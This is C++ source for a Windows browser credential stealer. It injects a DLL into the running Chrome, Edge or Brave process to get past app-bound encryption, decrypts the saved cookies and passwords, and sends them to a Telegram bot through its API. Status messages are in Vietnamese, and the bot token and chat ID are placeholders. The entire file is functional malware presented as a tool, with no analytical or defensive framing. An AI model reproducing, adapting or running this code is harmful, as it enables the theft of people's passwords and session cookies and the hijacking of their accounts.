// ---------------------------------------------------------------------------
// abe_inject.exe
// 1. Finds the browser process (browser process, NOT --type= child).
// 2. Injects abe_payload.dll (LoadLibrary) into it.
// 3. Payload calls IElevator::DecryptData and writes the 32-byte key.
// 4. This process decrypts v20/v10 cookies + passwords and sends to Telegram.
// ---------------------------------------------------------------------------
#include "abe_util.h"
#include <tlhelp32.h>
#include <shellapi.h>
#include <objbase.h>
#include <oleauto.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <winhttp.h>
#include <shlobj.h>
#include <algorithm>
#include <cstdlib>
#include <cwctype>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shell32.lib")

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------
static const std::wstring TG_TOKEN   = L"YOUR_BOT_TOKEN";
static const std::wstring TG_CHAT_ID = L"YOUR_CHAT_ID";
static const std::wstring TG_HOST    = L"api.telegram.org";

// ---------------------------------------------------------------------------
// Telegram
// ---------------------------------------------------------------------------
static std::string UrlEncode(const std::string& in) {
    static const char* hex = "0123456789ABCDEF";
    std::string out;
    out.reserve(in.size() * 3);
    for (unsigned char c : in) {
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            out += (char)c;
        } else {
            out += '%';
            out += hex[c >> 4];
            out += hex[c & 0x0F];
        }
    }
    return out;
}

static bool SendTextToTelegram(const std::wstring& text) {
    std::string enc = UrlEncode(W2U8(text));
    std::wstring object = L"/bot" + TG_TOKEN + L"/sendMessage?chat_id=" + TG_CHAT_ID +
                          L"&text=" + std::wstring(enc.begin(), enc.end());

    HINTERNET s = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return false;
    DWORD proto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    WinHttpSetOption(s, WINHTTP_OPTION_SECURE_PROTOCOLS, &proto, sizeof(proto));
    WinHttpSetTimeouts(s, 10000, 10000, 10000, 20000);

    HINTERNET c = WinHttpConnect(s, TG_HOST.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET r = c ? WinHttpOpenRequest(c, L"GET", object.c_str(), NULL,
                                         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                         WINHTTP_FLAG_SECURE) : NULL;
    BOOL ok = FALSE;
    if (r) {
        ok = WinHttpSendRequest(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0);
        if (ok) ok = WinHttpReceiveResponse(r, NULL);
    }
    if (r) WinHttpCloseHandle(r);
    if (c) WinHttpCloseHandle(c);
    WinHttpCloseHandle(s);
    return ok != FALSE;
}

static bool SendBytesToTelegram(const std::vector<BYTE>& data, const std::wstring& fileName) {
    HINTERNET s = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return false;
    DWORD proto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    WinHttpSetOption(s, WINHTTP_OPTION_SECURE_PROTOCOLS, &proto, sizeof(proto));
    WinHttpSetTimeouts(s, 10000, 10000, 10000, 20000);

    HINTERNET c = WinHttpConnect(s, TG_HOST.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    std::wstring object = L"/bot" + TG_TOKEN + L"/sendDocument";
    HINTERNET r = c ? WinHttpOpenRequest(c, L"POST", object.c_str(), NULL,
                                         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                         WINHTTP_FLAG_SECURE) : NULL;
    if (!r) {
        if (c) WinHttpCloseHandle(c);
        WinHttpCloseHandle(s);
        return false;
    }

    const std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    std::string body;
    body.reserve(data.size() + 512);
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    body += W2U8(TG_CHAT_ID) + "\r\n";
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + W2U8(fileName) + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body.append((const char*)data.data(), data.size());
    body += "\r\n--" + boundary + "--\r\n";

    std::wstring ctype = L"Content-Type: multipart/form-data; boundary=" +
                         std::wstring(boundary.begin(), boundary.end());
    WinHttpAddRequestHeaders(r, ctype.c_str(), (DWORD)-1,
                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    BOOL ok = WinHttpSendRequest(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                 (LPVOID)body.data(), (DWORD)body.size(),
                                 (DWORD)body.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(r, NULL);

    WinHttpCloseHandle(r);
    if (c) WinHttpCloseHandle(c);
    WinHttpCloseHandle(s);
    return ok != FALSE;
}

// ---------------------------------------------------------------------------
// Crypto
// ---------------------------------------------------------------------------
static std::vector<BYTE> DpapiUnprotect(const std::vector<BYTE>& in) {
    DATA_BLOB din{(DWORD)in.size(), (BYTE*)in.data()}, dout{};
    if (!CryptUnprotectData(&din, NULL, NULL, NULL, NULL, 0, &dout)) return {};
    std::vector<BYTE> out(dout.pbData, dout.pbData + dout.cbData);
    LocalFree(dout.pbData);
    return out;
}

static std::vector<BYTE> Sha256(const std::string& s) {
    std::vector<BYTE> out;
    BCRYPT_ALG_HANDLE alg = NULL;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return out;
    BCRYPT_HASH_HANDLE hash = NULL;
    if (BCryptCreateHash(alg, &hash, NULL, 0, NULL, 0, 0) == 0) {
        BCryptHashData(hash, (PUCHAR)s.data(), (ULONG)s.size(), 0);
        out.resize(32);
        if (BCryptFinishHash(hash, out.data(), 32, 0) != 0) out.clear();
        BCryptDestroyHash(hash);
    }
    BCryptCloseAlgorithmProvider(alg, 0);
    return out;
}

// blob = [v10|v20][12-byte nonce][ciphertext][16-byte tag]
static bool AesGcmDecrypt(const std::vector<BYTE>& key, const BYTE* blob, size_t len,
                          std::vector<BYTE>& out) {
    if (key.size() != 32 || len < 3 + 12 + 16) return false;
    const BYTE* nonce = blob + 3;
    const BYTE* ct    = blob + 3 + 12;
    size_t ctLen      = len - 3 - 12 - 16;
    const BYTE* tag   = blob + len - 16;

    BCRYPT_ALG_HANDLE alg = NULL;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return false;
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

    BCRYPT_KEY_HANDLE hKey = NULL;
    bool ok = false;
    if (BCryptGenerateSymmetricKey(alg, &hKey, NULL, 0, (PUCHAR)key.data(),
                                   (ULONG)key.size(), 0) == 0) {
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
        BCRYPT_INIT_AUTH_MODE_INFO(info);
        info.pbNonce = (PUCHAR)nonce;
        info.cbNonce = 12;
        info.pbTag   = (PUCHAR)tag;
        info.cbTag   = 16;

        out.resize(ctLen);
        ULONG done = 0;
        if (BCryptDecrypt(hKey, (PUCHAR)ct, (ULONG)ctLen, &info, NULL, 0,
                          out.data(), (ULONG)out.size(), &done, 0) == 0) {
            out.resize(done);
            ok = true;
        }
        BCryptDestroyKey(hKey);
    }
    BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

static std::string StripDomainHash(const std::vector<BYTE>& pt, const std::string& host) {
    if (pt.size() >= 32) {
        std::vector<BYTE> h = Sha256(host);
        if (h.size() == 32 && memcmp(pt.data(), h.data(), 32) == 0)
            return std::string((const char*)pt.data() + 32, pt.size() - 32);
    }
    return std::string((const char*)pt.data(), pt.size());
}

// ---------------------------------------------------------------------------
// winsqlite3 (system DLL, Windows 10/11)
// ---------------------------------------------------------------------------
struct sqlite3;
struct sqlite3_stmt;

struct Sqlite {
    HMODULE mod = NULL;
    int (*open_v2)(const char*, sqlite3**, int, const char*) = NULL;
    int (*prepare_v2)(sqlite3*, const char*, int, sqlite3_stmt**, const char**) = NULL;
    int (*step)(sqlite3_stmt*) = NULL;
    const unsigned char* (*column_text)(sqlite3_stmt*, int) = NULL;
    const void* (*column_blob)(sqlite3_stmt*, int) = NULL;
    int (*column_bytes)(sqlite3_stmt*, int) = NULL;
    int (*finalize)(sqlite3_stmt*) = NULL;
    int (*close)(sqlite3*) = NULL;

    bool Load() {
        mod = LoadLibraryW(L"winsqlite3.dll");
        if (!mod) return false;
        open_v2      = (decltype(open_v2))GetProcAddress(mod, "sqlite3_open_v2");
        prepare_v2   = (decltype(prepare_v2))GetProcAddress(mod, "sqlite3_prepare_v2");
        step         = (decltype(step))GetProcAddress(mod, "sqlite3_step");
        column_text  = (decltype(column_text))GetProcAddress(mod, "sqlite3_column_text");
        column_blob  = (decltype(column_blob))GetProcAddress(mod, "sqlite3_column_blob");
        column_bytes = (decltype(column_bytes))GetProcAddress(mod, "sqlite3_column_bytes");
        finalize     = (decltype(finalize))GetProcAddress(mod, "sqlite3_finalize");
        close        = (decltype(close))GetProcAddress(mod, "sqlite3_close");
        return open_v2 && prepare_v2 && step && column_text && column_blob &&
               column_bytes && finalize && close;
    }
};

static const int SQLITE_OK_ = 0;
static const int SQLITE_ROW_ = 100;
static const int SQLITE_OPEN_READONLY_ = 0x00000001;

static bool CopyShared(const std::wstring& src, const std::wstring& dst) {
    std::vector<BYTE> b;
    if (!ReadFileAll(src, b)) return false;
    return WriteFileAll(dst, b.data(), b.size());
}

static std::wstring CopyDbForRead(const std::wstring& src, const std::wstring& tag) {
    std::wstring dst = TempPath(tag);
    if (!CopyShared(src, dst)) return L"";
    CopyShared(src + L"-wal", dst + L"-wal");
    CopyShared(src + L"-shm", dst + L"-shm");
    return dst;
}

// ---------------------------------------------------------------------------
// App-bound key from Local State
// ---------------------------------------------------------------------------
static std::wstring LocalStatePath(const std::wstring& exeLower) {
    wchar_t appData[MAX_PATH] = {0};
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData))) return L"";
    if (exeLower == L"msedge.exe")
        return std::wstring(appData) + L"\\Microsoft\\Edge\\User Data\\Local State";
    if (exeLower == L"brave.exe")
        return std::wstring(appData) + L"\\BraveSoftware\\Brave-Browser\\User Data\\Local State";
    return std::wstring(appData) + L"\\Google\\Chrome\\User Data\\Local State";
}

static std::vector<BYTE> GetLegacyKey(const std::wstring& localState) {
    std::string json;
    if (!ReadFileText(localState, json)) return {};
    std::string b64;
    if (!ExtractJsonString(json, "encrypted_key", b64)) return {};
    std::vector<BYTE> blob = Base64Decode(b64);
    if (blob.size() > 5 && memcmp(blob.data(), "DPAPI", 5) == 0)
        blob.erase(blob.begin(), blob.begin() + 5);
    return DpapiUnprotect(blob);
}

// ---------------------------------------------------------------------------
// Process discovery / injection
// ---------------------------------------------------------------------------
typedef LONG (NTAPI *pfnNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

struct MY_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; };
struct MY_PEB { BYTE Reserved1[0x20]; PVOID ProcessParameters; };
struct MY_RTL_USER_PROCESS_PARAMETERS { BYTE Reserved1[0x70]; MY_UNICODE_STRING CommandLine; };
struct MY_PROCESS_BASIC_INFORMATION {
    PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId; PVOID Reserved3;
};

static std::wstring GetProcessCommandLine(HANDLE hProc) {
    static pfnNtQueryInformationProcess ntQuery =
        (pfnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                                                     "NtQueryInformationProcess");
    if (!ntQuery) return L"";

    MY_PROCESS_BASIC_INFORMATION pbi{};
    if (ntQuery(hProc, 0, &pbi, sizeof(pbi), NULL) != 0 || !pbi.PebBaseAddress)
        return L"";

    MY_PEB peb{};
    if (!ReadProcessMemory(hProc, pbi.PebBaseAddress, &peb, sizeof(peb), NULL) ||
        !peb.ProcessParameters)
        return L"";

    MY_RTL_USER_PROCESS_PARAMETERS params{};
    if (!ReadProcessMemory(hProc, peb.ProcessParameters, &params, sizeof(params), NULL) ||
        params.CommandLine.Length == 0 || !params.CommandLine.Buffer)
        return L"";

    std::wstring cmd(params.CommandLine.Length / sizeof(wchar_t), L'\0');
    if (!ReadProcessMemory(hProc, params.CommandLine.Buffer, &cmd[0],
                           params.CommandLine.Length, NULL))
        return L"";
    return cmd;
}

static DWORD FindBrowserPid(const std::wstring& wantExe) {
    DWORD lowest = 0, lowestNoType = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    for (BOOL ok = Process32FirstW(snap, &pe); ok; ok = Process32NextW(snap, &pe)) {
        std::wstring exe = pe.szExeFile;
        for (auto& c : exe) c = towlower(c);
        if (exe != L"chrome.exe" && exe != L"msedge.exe" && exe != L"brave.exe")
            continue;
        if (!wantExe.empty() && exe != wantExe)
            continue;

        if (!lowest || pe.th32ProcessID < lowest) lowest = pe.th32ProcessID;

        HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE,
                               pe.th32ProcessID);
        if (h) {
            std::wstring cmd = GetProcessCommandLine(h);
            CloseHandle(h);
            if (!cmd.empty() && cmd.find(L"--type=") == std::wstring::npos) {
                if (!lowestNoType || pe.th32ProcessID < lowestNoType)
                    lowestNoType = pe.th32ProcessID;
            }
        }
    }
    CloseHandle(snap);
    return lowestNoType ? lowestNoType : lowest;
}

static void EnableDebugPrivilege() {
    HANDLE token = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return;
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(token);
}

static bool InjectDll(DWORD pid, const std::wstring& dllPath) {
    HANDLE h = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                           PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                           FALSE, pid);
    if (!h) return false;

    SIZE_T bytes = (dllPath.size() + 1) * sizeof(wchar_t);
    LPVOID remote = VirtualAllocEx(h, NULL, bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) { CloseHandle(h); return false; }

    bool ok = WriteProcessMemory(h, remote, dllPath.c_str(), bytes, NULL) != FALSE;
    if (ok) {
        HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
        FARPROC loadLib = GetProcAddress(k32, "LoadLibraryW");
        HANDLE th = CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)loadLib,
                                       remote, 0, NULL);
        if (th) {
            WaitForSingleObject(th, 10000);
            CloseHandle(th);
        } else {
            ok = false;
        }
    }
    VirtualFreeEx(h, remote, 0, MEM_RELEASE);
    CloseHandle(h);
    return ok;
}

// ---------------------------------------------------------------------------
// Dumpers
// ---------------------------------------------------------------------------
static bool DumpCookies(const std::wstring& dbPath, const std::vector<BYTE>& abeKey,
                        const std::vector<BYTE>& legacyKey, std::string& out) {
    std::wstring copy = CopyDbForRead(dbPath, L"abe_cookies.db");
    if (copy.empty()) return false;

    Sqlite sql;
    if (!sql.Load()) { DeleteFileW(copy.c_str()); return false; }

    sqlite3* db = NULL;
    if (sql.open_v2(W2U8(copy).c_str(), &db, SQLITE_OPEN_READONLY_, NULL) != SQLITE_OK_ || !db) {
        DeleteFileW(copy.c_str());
        return false;
    }

    sqlite3_stmt* st = NULL;
    if (sql.prepare_v2(db, "SELECT host_key,name,encrypted_value FROM cookies",
                       -1, &st, NULL) == SQLITE_OK_ && st) {
        while (sql.step(st) == SQLITE_ROW_) {
            const char* host = (const char*)sql.column_text(st, 0);
            const char* name = (const char*)sql.column_text(st, 1);
            const void* blob = sql.column_blob(st, 2);
            int n = sql.column_bytes(st, 2);
            if (!host || !name || !blob || n < 3) continue;

            std::vector<BYTE> enc((const BYTE*)blob, (const BYTE*)blob + n);
            std::vector<BYTE> pt;
            bool ok = false;

            if (memcmp(enc.data(), "v20", 3) == 0 && !abeKey.empty())
                ok = AesGcmDecrypt(abeKey, enc.data(), enc.size(), pt);
            else if (memcmp(enc.data(), "v10", 3) == 0 && !legacyKey.empty())
                ok = AesGcmDecrypt(legacyKey, enc.data(), enc.size(), pt);

            if (!ok) continue;
            std::string value = StripDomainHash(pt, host);
            out += "{\"host\":\"" + JsonEscape(host) +
                   "\",\"name\":\"" + JsonEscape(name) +
                   "\",\"value\":\"" + JsonEscape(value) + "\"}\n";
        }
        sql.finalize(st);
    }
    sql.close(db);
    DeleteFileW(copy.c_str());
    DeleteFileW((copy + L"-wal").c_str());
    DeleteFileW((copy + L"-shm").c_str());
    return !out.empty();
}

static bool DumpPasswords(const std::wstring& dbPath, const std::vector<BYTE>& abeKey,
                          const std::vector<BYTE>& legacyKey, std::string& out) {
    std::wstring copy = CopyDbForRead(dbPath, L"abe_logins.db");
    if (copy.empty()) return false;

    Sqlite sql;
    if (!sql.Load()) { DeleteFileW(copy.c_str()); return false; }

    sqlite3* db = NULL;
    if (sql.open_v2(W2U8(copy).c_str(), &db, SQLITE_OPEN_READONLY_, NULL) != SQLITE_OK_ || !db) {
        DeleteFileW(copy.c_str());
        return false;
    }

    sqlite3_stmt* st = NULL;
    if (sql.prepare_v2(db, "SELECT origin_url,username_value,password_value FROM logins",
                       -1, &st, NULL) == SQLITE_OK_ && st) {
        while (sql.step(st) == SQLITE_ROW_) {
            const char* url  = (const char*)sql.column_text(st, 0);
            const char* user = (const char*)sql.column_text(st, 1);
            const void* blob = sql.column_blob(st, 2);
            int n = sql.column_bytes(st, 2);
            if (!url || !user || !blob || n < 3) continue;

            std::vector<BYTE> enc((const BYTE*)blob, (const BYTE*)blob + n);
            std::vector<BYTE> pt;
            bool ok = false;

            if (memcmp(enc.data(), "v20", 3) == 0 && !abeKey.empty())
                ok = AesGcmDecrypt(abeKey, enc.data(), enc.size(), pt);
            else if (memcmp(enc.data(), "v10", 3) == 0 && !legacyKey.empty())
                ok = AesGcmDecrypt(legacyKey, enc.data(), enc.size(), pt);

            if (!ok) continue;
            std::string pass((const char*)pt.data(), pt.size());
            out += "{\"url\":\"" + JsonEscape(url) +
                   "\",\"user\":\"" + JsonEscape(user) +
                   "\",\"pass\":\"" + JsonEscape(pass) + "\"}\n";
        }
        sql.finalize(st);
    }
    sql.close(db);
    DeleteFileW(copy.c_str());
    DeleteFileW((copy + L"-wal").c_str());
    DeleteFileW((copy + L"-shm").c_str());
    return !out.empty();
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------
static std::wstring Lower(std::wstring s) {
    for (auto& c : s) c = towlower(c);
    return s;
}

static int Run() {
    EnableDebugPrivilege();

    // argv: [optional] chrome|edge|brave|<pid>
    std::wstring wantExe;
    DWORD overridePid = 0;
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argv && argc > 1) {
        std::wstring a = Lower(argv[1]);
        if (a == L"chrome") wantExe = L"chrome.exe";
        else if (a == L"edge") wantExe = L"msedge.exe";
        else if (a == L"brave") wantExe = L"brave.exe";
        else overridePid = (DWORD)_wtoi(argv[1]);
    }
    if (argv) LocalFree(argv);

    DWORD pid = overridePid;
    if (!pid) {
        if (!wantExe.empty()) {
            pid = FindBrowserPid(wantExe);
        } else {
            const wchar_t* order[] = {L"chrome.exe", L"msedge.exe", L"brave.exe"};
            for (auto e : order) {
                pid = FindBrowserPid(e);
                if (pid) break;
            }
        }
    }
    if (!pid) {
        SendTextToTelegram(L"ABE: không tìm thấy tiến trình browser.");
        return 1;
    }

    // Always derive the browser identity from the actual target process image.
    std::wstring exeLower = wantExe.empty() ? L"chrome.exe" : wantExe;
    {
        HANDLE hp = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (hp) {
            wchar_t img[MAX_PATH] = {0};
            DWORD sz = MAX_PATH;
            if (QueryFullProcessImageNameW(hp, 0, img, &sz)) {
                std::wstring f = img;
                size_t slash = f.find_last_of(L"\\/");
                exeLower = Lower(slash == std::wstring::npos ? f : f.substr(slash + 1));
            }
            CloseHandle(hp);
        }
    }

    std::wstring dllPath = SelfDir() + L"abe_payload.dll";
    if (GetFileAttributesW(dllPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        SendTextToTelegram(L"ABE: thiếu abe_payload.dll cạnh injector.");
        return 2;
    }

    std::wstring keyPath = TempPath(L"abe_key.bin");
    std::wstring errPath = TempPath(L"abe_key_err.txt");
    DeleteFileW(keyPath.c_str());
    DeleteFileW(errPath.c_str());

    if (!InjectDll(pid, dllPath)) {
        SendTextToTelegram(L"ABE: inject thất bại (OpenProcess/CreateRemoteThread).");
        return 3;
    }

    std::vector<BYTE> abeKey;
    for (int i = 0; i < 300; ++i) { // 30s
        if (GetFileAttributesW(keyPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            ReadFileAll(keyPath, abeKey);
            break;
        }
        if (GetFileAttributesW(errPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            std::string e;
            ReadFileText(errPath, e);
            SendTextToTelegram(L"ABE payload: " + U82W(e));
            return 4;
        }
        Sleep(100);
    }
    if (abeKey.size() != 32) {
        SendTextToTelegram(L"ABE: không lấy được key (timeout).");
        return 5;
    }

    std::wstring localState = LocalStatePath(exeLower);
    std::vector<BYTE> legacyKey = GetLegacyKey(localState);

    wchar_t appData[MAX_PATH] = {0};
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData);
    std::wstring base;
    if (exeLower == L"msedge.exe")      base = std::wstring(appData) + L"\\Microsoft\\Edge\\User Data\\Default";
    else if (exeLower == L"brave.exe")  base = std::wstring(appData) + L"\\BraveSoftware\\Brave-Browser\\User Data\\Default";
    else                                base = std::wstring(appData) + L"\\Google\\Chrome\\User Data\\Default";

    std::string cookies, logins;
    DumpCookies(base + L"\\Network\\Cookies", abeKey, legacyKey, cookies);
    DumpPasswords(base + L"\\Login Data", abeKey, legacyKey, logins);

    int total = 0;
    if (!cookies.empty()) {
        total += (int)std::count(cookies.begin(), cookies.end(), '\n');
        std::vector<BYTE> b(cookies.begin(), cookies.end());
        SendBytesToTelegram(b, L"abe_cookies.json");
    }
    if (!logins.empty()) {
        total += (int)std::count(logins.begin(), logins.end(), '\n');
        std::vector<BYTE> b(logins.begin(), logins.end());
        SendBytesToTelegram(b, L"abe_passwords.json");
    }

    SendTextToTelegram(L"ABE dump xong: " + std::to_wstring(total) + L" mục. Key OK.");

    DeleteFileW(keyPath.c_str());
    DeleteFileW(errPath.c_str());
    return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    return Run();
}
